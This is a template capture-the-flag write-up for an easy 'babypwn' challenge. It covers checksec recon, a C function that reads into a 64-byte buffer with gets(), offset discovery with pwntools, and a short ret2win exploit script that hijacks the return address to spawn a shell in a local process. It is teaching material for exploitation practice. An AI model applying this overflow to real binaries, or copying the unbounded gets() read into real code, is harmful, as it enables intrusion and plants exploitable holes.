---
title: 'babypwn — a classic stack buffer overflow'
description: 'Smashing the stack to redirect execution to a win() function. A template write-up.'
date: 2026-07-06
event: 'Sample CTF 2026'
category: 'pwn'
difficulty: 'easy'
points: 100
tags: ['pwn', 'buffer-overflow', 'ret2win']
flag: 'sample{th1s_1s_wh3r3_th3_fl4g_g03s}'
draft: false
---

> This is a template write-up. Replace it with a real one — but keep the shape:
> recon → vulnerability → exploit → flag.

## Recon

We're given a 64-bit ELF binary. First, the usual checks:

```console
$ file babypwn
babypwn: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ checksec --file=babypwn
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found      # <- no stack protector
NX:       NX enabled
PIE:      No PIE (0x400000)    # <- fixed addresses, nice
```

No stack canary and no PIE — a textbook `ret2win` setup.

## The vulnerability

Decompiling `main` shows an unbounded read into a fixed-size buffer:

```c
void vuln() {
    char buf[64];
    puts("give me your input:");
    gets(buf);          // <- reads until newline, no bounds check
}

void win() {
    system("/bin/sh");  // never called normally
}
```

`gets()` will happily write past the end of `buf`, letting us overwrite the
saved return address on the stack.

## Finding the offset

The buffer is 64 bytes, plus 8 bytes of saved RBP, so the return address sits
at offset **72**. Confirm with a cyclic pattern:

```python
from pwn import *

context.binary = elf = ELF('./babypwn')
p = process('./babypwn')
p.sendline(cyclic(200))
p.wait()

core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8))
log.info('offset = %d', offset)   # -> 72
```

## The exploit

Overflow the buffer, then overwrite the return address with `win()`:

```python
from pwn import *

elf = ELF('./babypwn')
p = process('./babypwn')

payload  = b'A' * 72
payload += p64(elf.symbols['win'])

p.sendline(payload)
p.interactive()
```

```console
$ python3 exploit.py
[+] Starting local process './babypwn': pid 12345
[*] Switching to interactive mode
$ cat flag.txt
sample{th1s_1s_wh3r3_th3_fl4g_g03s}
```

## Takeaways

- No canary + no PIE = jump straight to a `win()` gadget.
- `gets()` is never safe; the presence of it in a binary is a red flag.
- Always `checksec` first — the mitigations tell you which technique applies.

The captured flag is in the spoiler below.
